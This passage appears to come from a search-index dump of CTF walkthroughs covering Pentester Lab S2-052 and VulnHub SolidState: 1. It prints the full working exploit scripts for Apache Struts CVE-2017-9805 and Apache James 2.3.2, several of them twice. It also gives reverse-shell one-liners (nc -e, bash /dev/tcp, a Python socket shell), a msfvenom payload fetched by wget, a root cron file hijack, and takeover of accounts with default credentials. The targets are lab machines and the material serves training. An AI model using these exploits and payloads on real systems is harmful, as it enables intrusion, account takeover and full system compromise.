~ \u2514\u2500$ searchsploit -m linux/remote/42627.py Exploit: Apache Struts 2 .5 < 2 .5.12 - REST Plugin XStream Remote Code Execution URL: https://www.exploit-db.com/exploits/42627 Path: /usr/share/exploitdb/exploits/linux/remote/42627.py File Type: UTF-8 Unicode text, with CRLF line terminators Copied to: /home/kali/42627.py 42627.py # Exploit Title: Struts 2.5 - 2.5.12 REST Plugin XStream RCE # Google Dork: filetype:action # Date: 06/09/2017 # Exploit Author: Warflop # Vendor Homepage: https://struts.apache.org/ # Software Link: http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip # Version: Struts 2.5 \u2013 Struts 2.5.12 # Tested on: Struts 2.5.10 # CVE : 2017-9805 #!/usr/bin/env python3 # coding=utf-8 # ***************************************************** # Struts CVE-2017-9805 Exploit # Warflop (http://securityattack.com.br/) # Greetz: Pimps & G4mbl3r # ***************************************************** import requests import sys def exploration ( command ): exploit = ''' <map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"> <dataHandler> <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"> <is class=\"javax.crypto.CipherInputStream\"> <cipher class=\"javax.crypto.NullCipher\"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"java.util.Collections$EmptyIterator\"/> <next class=\"java.lang.ProcessBuilder\"> <command> <string>/bin/sh</string><string>-c</string><string>''' + command + '''</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class=\"javax.imageio.ImageIO$ContainsFilter\"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class=\"string\">foo</next> </serviceIterator> <lock/> </cipher> <input class=\"java.lang.ProcessBuilder$NullInputStream\"/> <ibuffer/> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> </entry> </map> ''' url = sys . argv [ 1 ] headers = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0' , 'Content-Type' : 'application/xml' } request = requests . post ( url , data = exploit , headers = headers ) print ( request . text ) if len ( sys . argv ) < 3 : print ( 'CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE' ) print ( '[*] Warflop - http://securityattack.com.br' ) print ( '[*] Greatz: Pimps & G4mbl3r' ) print ( '[*] Use: python struts2.py URL COMMAND' ) print ( '[*] Example: python struts2.py http://sitevulnerable.com/struts2-rest-showcase/orders/3 id' ) exit ( 0 ) else : exploration ( sys . argv [ 2 ]) Remote code execution ping Check remote code with tcpdump . Let's open tcpdump in Kali machine. sudo tcpdump -i eth0 icmp Run exploit 42627.py python3 42627 .py http://192.168.110.137/orders/3 'ping -c 2 192.168.110.131' re using nc Create a listener in Kali machine. sudo nc -nvlp 4444 Get reverse shell python3 42627 .py http://192.168.110.137/orders/3 'nc 192.168.110.131 4444 -e /bin/sh' > /dev/null msfvenom file Create payload file with msfvenom msfvenom -p linux/x86/shell_reverse_tcp LHOST = 192 .168.110.131 LPORT = 4444 -f elf > shell.elf Create a http server to transfer payload file. sudo python3 -m http.server 80 Download file shell.elf using 42627.py and wget python3 42627 .py http://192.168.110.137/orders/3 'wget http://192.168.110.131/shell.elf -O /tmp/shell' Create a listener in Kali machine. sudo nc -nvlp 4444 Execute file shell.elf and get reverse shell python3 42627.py http://192.168.110.137/orders/3 'chmod +x /tmp/shell' > /dev/null python3 42627.py http://192.168.110.137/orders/3 '/tmp/shell' > /dev/null","title":"Pentester Lab: S2-052"},{"location":"walkthrough/vulnhub/S2-052/index.html#pentester-lab-s2-052","text":"Author: Hades Scripting here","title":"Pentester Lab: S2-052"},{"location":"walkthrough/vulnhub/S2-052/index.html#enumeration","text":"","title":"Enumeration"},{"location":"walkthrough/vulnhub/S2-052/index.html#open-services","text":"This is a web application, let's go with gobuster to enum more the hidden. \u250c\u2500\u2500 ( Hades\u327f172.17.0.1 ) - [ 0 .8:22.4 ] ~ \u2514\u2500$ gobuster dir -u http://192.168.110.137 -w /usr/share/seclists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @_FireFart_ ) =============================================================== [ + ] Url: http://192.168.110.137 [ + ] Threads: 10 [ + ] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [ + ] Status codes: 200 ,204,301,302,307,401,403 [ + ] User Agent: gobuster/3.0.1 [ + ] Timeout: 10s =============================================================== 2021 /01/27 22 :14:58 Starting gobuster =============================================================== /META-INF ( Status: 302 ) /WEB-INF ( Status: 302 ) /css ( Status: 302 ) /fonts ( Status: 302 ) /orders ( Status: 200 ) =============================================================== 2021 /01/27 22 :15:01 Finished =============================================================== Go to uri \"/orders\" and check how app work. Orders view-source","title":"Open Services"},{"location":"walkthrough/vulnhub/S2-052/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/vulnhub/S2-052/index.html#cve-2017-9805","text":"Look around in the internet, I found CVE-2017-9805 with key word \"orders.xhtml exploit\". struts-pwn - CVE-2017-9805 Exploit Let's use searchsploit to find more about this vulnerability. searchsploit \u250c\u2500\u2500 ( Hades\u327f172.17.0.1 ) - [ 0 .8:22.1 ] ~ \u2514\u2500$ searchsploit struts rest ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Executi | multiple/remote/39919.rb Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Executi | multiple/remote/43382.py Apache Struts 2 .5 < 2 .5.12 - REST Plugin XStream Remote Code Execution | linux/remote/42627.py ------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results \u250c\u2500\u2500 ( Hades\u327f172.17.0.1 ) - [ 0 .8:22.1 ] ~ \u2514\u2500$ searchsploit -m linux/remote/42627.py Exploit: Apache Struts 2 .5 < 2 .5.12 - REST Plugin XStream Remote Code Execution URL: https://www.exploit-db.com/exploits/42627 Path: /usr/share/exploitdb/exploits/linux/remote/42627.py File Type: UTF-8 Unicode text, with CRLF line terminators Copied to: /home/kali/42627.py 42627.py # Exploit Title: Struts 2.5 - 2.5.12 REST Plugin XStream RCE # Google Dork: filetype:action # Date: 06/09/2017 # Exploit Author: Warflop # Vendor Homepage: https://struts.apache.org/ # Software Link: http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip # Version: Struts 2.5 \u2013 Struts 2.5.12 # Tested on: Struts 2.5.10 # CVE : 2017-9805 #!/usr/bin/env python3 # coding=utf-8 # ***************************************************** # Struts CVE-2017-9805 Exploit # Warflop (http://securityattack.com.br/) # Greetz: Pimps & G4mbl3r # ***************************************************** import requests import sys def exploration ( command ): exploit = ''' <map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"> <dataHandler> <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"> <is class=\"javax.crypto.CipherInputStream\"> <cipher class=\"javax.crypto.NullCipher\"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"java.util.Collections$EmptyIterator\"/> <next class=\"java.lang.ProcessBuilder\"> <command> <string>/bin/sh</string><string>-c</string><string>''' + command + '''</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class=\"javax.imageio.ImageIO$ContainsFilter\"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class=\"string\">foo</next> </serviceIterator> <lock/> </cipher> <input class=\"java.lang.ProcessBuilder$NullInputStream\"/> <ibuffer/> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> </entry> </map> ''' url = sys . argv [ 1 ] headers = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0' , 'Content-Type' : 'application/xml' } request = requests . post ( url , data = exploit , headers = headers ) print ( request . text ) if len ( sys . argv ) < 3 : print ( 'CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE' ) print ( '[*] Warflop - http://securityattack.com.br' ) print ( '[*] Greatz: Pimps & G4mbl3r' ) print ( '[*] Use: python struts2.py URL COMMAND' ) print ( '[*] Example: python struts2.py http://sitevulnerable.com/struts2-rest-showcase/orders/3 id' ) exit ( 0 ) else : exploration ( sys . argv [ 2 ])","title":"CVE-2017-9805"},{"location":"walkthrough/vulnhub/S2-052/index.html#remote-code-execution","text":"ping Check remote code with tcpdump . Let's open tcpdump in Kali machine. sudo tcpdump -i eth0 icmp Run exploit 42627.py python3 42627 .py http://192.168.110.137/orders/3 'ping -c 2 192.168.110.131' re using nc Create a listener in Kali machine. sudo nc -nvlp 4444 Get reverse shell python3 42627 .py http://192.168.110.137/orders/3 'nc 192.168.110.131 4444 -e /bin/sh' > /dev/null msfvenom file Create payload file with msfvenom msfvenom -p linux/x86/shell_reverse_tcp LHOST = 192 .168.110.131 LPORT = 4444 -f elf > shell.elf Create a http server to transfer payload file. sudo python3 -m http.server 80 Download file shell.elf using 42627.py and wget python3 42627 .py http://192.168.110.137/orders/3 'wget http://192.168.110.131/shell.elf -O /tmp/shell' Create a listener in Kali machine. sudo nc -nvlp 4444 Execute file shell.elf and get reverse shell python3 42627.py http://192.168.110.137/orders/3 'chmod +x /tmp/shell' > /dev/null python3 42627.py http://192.168.110.137/orders/3 '/tmp/shell' > /dev/null","title":"Remote code execution"},{"location":"walkthrough/vulnhub/SolidState-1/index.html","text":"VulnHub SolidState: 1 Author: Hades Scripting here Enumeration Openning Services \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[1.4:12.0]~/bash-script \u2514\u2500$ sudo ./auto_enum.sh 192.168.11.141 Scanning openning port ... [+] Openning ports: 22,25,80,110,119,4555 \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[5.1:12.1]~/bash-script \u2514\u2500$ nmap -sC -sV 192.168.11.141 -p22,25,80,110,119,4555 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 06:41 EDT Nmap scan report for 192.168.11.141 Host is up (0.00031s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (192.168.11.140 [192.168.11.140]), PIPELINING, ENHANCEDSTATUSCODES, 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open james-admin JAMES Remote Admin 2.3.2 Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds Web Application [+] Files and directories gobuster dir -k -u http://192.168.11.141:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [ + ] Url: http://192.168.11.141:80 [ + ] Method: GET [ + ] Threads: 10 [ + ] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [ + ] Negative Status codes: 404 [ + ] User Agent: gobuster/3.1.0 [ + ] Timeout: 10s =============================================================== 2021 /03/16 09 :34:06 Starting gobuster in directory enumeration mode =============================================================== /.hta ( Status: 403 ) [ Size: 293 ] /.htpasswd ( Status: 403 ) [ Size: 298 ] /.htaccess ( Status: 403 ) [ Size: 298 ] /assets ( Status: 301 ) [ Size: 317 ] [ --> http://192.168.11.141/assets/ ] /images ( Status: 301 ) [ Size: 317 ] [ --> http://192.168.11.141/images/ ] /index.html ( Status: 200 ) [ Size: 7776 ] /server-status ( Status: 403 ) [ Size: 302 ] =============================================================== 2021 /03/16 09 :34:07 Finished =============================================================== [+] All URLs < title > Home - Solid State Security </ title > < link rel = \"stylesheet\" href = \"assets/css/main.css\" /> <!--[if lte IE 9]><link rel=\"stylesheet\" href=\"assets/css/ie9.css\" /><![endif]--> <!--[if lte IE 8]><link rel=\"stylesheet\" href=\"assets/css/ie8.css\" /><![endif]--> < h1 >< a href = \"index.html\" > Solid State Security </ a ></ h1 > < a href = \"#menu\" > Menu </ a > < li >< a href = \"index.html\" > Home </ a ></ li > < li >< a href = \"services.html\" > Services </ a ></ li > < li >< a href = \"about.html\" > About Us </ a ></ li > < a href = \"#\" class = \"close\" > Close </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic01.jpg\" alt = \"\" /></ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic02.jpg\" alt = \"\" /></ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic03.jpg\" alt = \"\" /></ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic04.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic05.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic06.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < a href = \"#\" class = \"image\" >< img src = \"images/pic07.jpg\" alt = \"\" /></ a > < a href = \"services.html\" class = \"special\" > Learn more </ a > < li >< a href = \"services.html\" class = \"button\" > Browse All </ a ></ li > < li class = \"fa-envelope\" >< a href = \"#\" > webadmin@solid-state-security.com </ a ></ li > JAMES Server SMTP nmap 192.168.11.141 -p25 --script=smtp-* Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 09:33 EDT Nmap scan report for 192.168.11.141 Host is up (0.00032s latency). PORT STATE SERVICE 25/tcp open smtp |_smtp-commands: solidstate Hello nmap.scanme.org (192.168.11.140 [192.168.11.140]), PIPELINING, ENHANCEDSTATUSCODES, | smtp-enum-users: |_ root |_smtp-open-relay: Server is an open relay (4/16 tests) | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE MAC Address: 00:0C:29:E1:D2:9B (VMware) Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds JAMES Remote Admin Using JAMES Service, I tried the default credentials of JAMES Remote Admin root:root and gained the access. \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[1.0:15.8]~ \u2514\u2500$ nc -nv 192.168.11.141 4555 (UNKNOWN) [192.168.11.141] 4555 (?) open JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands Foothold Mailbox to SSH credential In the JAMES Remote Admin, I changed all user's passwd to 123456. listusers Existing accounts 6 user: james user: thomas user: john user: mindy user: mailadmin setpassword james 123456 Password for james reset setpassword thomas 123456 Password for thomas reset setpassword john 123456 Password for john reset setpassword mindy 123456 Password for mindy reset setpassword mailadmin 123456 Password for mailadmin reset Revew mailbox and gather more information. script \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[0.4:30.2]~/bash-script/mailbox \u2514\u2500$ python mailbox.py 192.168.11.141 MailBox: james +OK 0 0 MailBox: thomas +OK 0 0 MailBox: john +OK 1 743 Mail: 1 1 743 . +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <john@localhost>; Tue, 22 Aug 2017 13:16:20 -0400 (EDT) Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James . MailBox: mindy +OK 2 1945 Mail: 1 1 1109 2 836 . +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for <mindy@localhost>; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . Mail: 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <mindy@localhost>; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . MailBox: mailadmin +OK 0 0 james \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.7 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 1 \u2a2f +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user james +OK pass 123456 +OK Welcome james list +OK 0 0 . quit +OK Apache James POP3 Server signing off. thomas \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user thomas +OK pass 123456 +OK Welcome thomas list +OK 0 0 . quit +OK Apache James POP3 Server signing off. john \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user john +OK pass 123456 +OK Welcome john list +OK 1 743 1 743 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 9564574 .1.1503422198108.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 581 for <john@localhost> ; Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :16:20 -0400 ( EDT ) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy ' s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James . quit +OK Apache James POP3 Server signing off. mindy \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user mindy +OK pass 123456 +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . retr 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 5420213 .0.1503422039826.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 798 for <mindy@localhost> ; Tue, 22 Aug 2017 13 :13:42 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :13:42 -0400 ( EDT ) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . retr 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: < 16744123 .2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1 .0 Content-Type: text/plain ; charset = us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192 .168.11.142 ([ 192 .168.11.142 ]) by solidstate ( JAMES SMTP Server 2 .3.2 ) with SMTP ID 581 for <mindy@localhost> ; Tue, 22 Aug 2017 13 :17:28 -0400 ( EDT ) Date: Tue, 22 Aug 2017 13 :17:28 -0400 ( EDT ) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . quit +OK Apache James POP3 Server signing off. mailadmin \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 3 .1:21.8 ] ~ \u2514\u2500$ nc -nC 192 .168.11.141 110 +OK solidstate POP3 server ( JAMES POP3 Server 2 .3.2 ) ready user mailadmin +OK pass 123456 +OK Welcome mailadmin list +OK 0 0 . quit +OK Apache James POP3 Server signing off. At here, I had a ssh credential mindy:P@55W0rd1!2@ ssh mindy@192.168.11.141 Privilege escalation James server RCE to bypass retrict bash \u250c\u2500\u2500 ( Hades\u327f192.168.11.140 ) - [ 0 .6:16.0 ] ~ \u2514\u2500$ searchsploit JAMES 2 .3.2 ------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------- --------------------------------- Apache James Server 2 .3.2 - Insecure User Creation Arbitrary File Write | linux/remote/48130.rb Apache James Server 2 .3.2 - Remote Command Execution | linux/remote/35513.py ------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploit linux/remote/35513.py need a user login to the system to run the payload. Modify and execute poc Change payload to execute reverse shell payload = 'bash -i >& /dev/tcp/192.168.11.140/8080 0>&1' # to exploit on any user Open listener and execute payload sudo nc -nvlp 8080 python 35513 .py 192 .168.11.141 ssh mindy@192.168.11.141 35513.py #!/usr/bin/python # # Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution # Date: 16\\10\\2014 # Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec # Vendor Homepage: http://james.apache.org/server/ # Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip # Version: Apache James Server 2.3.2 # Tested on: Ubuntu, Debian # Info: This exploit works on default installation of Apache James Server 2.3.2 # Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d import socket import sys import time # specify payload payload = 'bash -i >& /dev/tcp/192.168.11.140/8080 0>&1' # to exploit on any user # payload = '[ \"$(id -u)\" == \"0\" ] && touch /root/proof.txt' # to exploit only on root # credentials to James Remote Administration Tool (Default - root/root) user = 'root' pwd = 'root' if len ( sys . argv ) != 2 : sys . stderr . write ( \"[-]Usage: python %s <ip> \\n \" % sys . argv [ 0 ]) sys . stderr . write ( \"[-]Exemple: python %s 127.0.0.1 \\n \" % sys . argv [ 0 ]) sys . exit ( 1 ) ip = sys . argv [ 1 ] def recv ( s ): s . recv ( 1024 ) time . sleep ( 0.2 ) try : print \"[+]Connecting to James Remote Administration Tool...\" s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( ip , 4555 )) s . recv ( 1024 ) s . send ( user + \" \\n \" ) s . recv ( 1024 ) s . send ( pwd + \" \\n \" ) s . recv ( 1024 ) print \"[+]Creating user...\" s . send ( \"adduser ../../../../../../../../etc/bash_completion.d exploit \\n \" ) s . recv ( 1024 ) s . send ( \"quit \\n \" ) s . close () print \"[+]Connecting to James SMTP server...\" s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( ip , 25 )) s . send ( \"ehlo team@team.pl \\r\\n \" ) recv ( s ) print \"[+]Sending payload...\" s . send ( \"mail from: <'@team.pl> \\r\\n \" ) recv ( s ) # also try s.send(\"rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\\r\\n\") if the recipient cannot be found s . send ( \"rcpt to: <../../../../../../../../etc/bash_completion.d> \\r\\n \" ) recv ( s ) s . send ( \"data \\r\\n \" ) recv ( s ) s . send ( \"From: team@team.pl \\r\\n \" ) s . send ( \" \\r\\n \" ) s . send ( \"' \\n \" ) s . send ( payload + \" \\n \" ) s . send ( \" \\r\\n . \\r\\n \" ) recv ( s ) s . send ( \"quit \\r\\n \" ) recv ( s ) s . close () print \"[+]Done! Payload will be executed once somebody logs in.\" except : print \"Connection failed.\" Using pspy to monitor process All user can read, write, modify file tmp.py ${ debian_chroot :+( $debian_chroot ) } mindy@solidstate:~$ ls -l /opt/tmp.py ls -l /opt/tmp.py -rwxrwxrwx 1 root root 105 Aug 22 2017 /opt/tmp.py Create reverse shell python and replace file tmp.py import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"192.168.11.140\" , 4242 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); import pty ; pty . spawn ( \"/bin/bash\" ) I'M ROOT!","title":"SolidState: 1"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#vulnhub-solidstate-1","text":"Author: Hades Scripting here","title":"VulnHub SolidState: 1"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#enumeration","text":"","title":"Enumeration"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#openning-services","text":"\u250c\u2500\u2500(Hades\u327f192.168.11.140)-[1.4:12.0]~/bash-script \u2514\u2500$ sudo ./auto_enum.sh 192.168.11.141 Scanning openning port ... [+] Openning ports: 22,25,80,110,119,4555 \u250c\u2500\u2500(Hades\u327f192.168.11.140)-[5.1:12.1]~/bash-script \u2514\u2500$ nmap -sC -sV 192.168.11.141 -p22,25,80,110,119,4555 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 06:41 EDT Nmap scan report for 192.168.11.141 Host is up (0.00031s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (192.168.11.140 [192.168.11.140]), PIPELINING, ENHANCEDSTATUSCODES, 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open james-admin JAMES Remote Admin 2.3.2 Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds","title":"Openning Services"},{"location":"walkthrough/vulnhub/SolidState-1/index.html#web-application","text":"[+] Files and directories gobuster dir -k -u http://192.168.11.141:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [ + ] Url: http://192.168.11.141:80 [ + ] Method: GET [ + ] Threads: 10 [ + ] Wordlist: 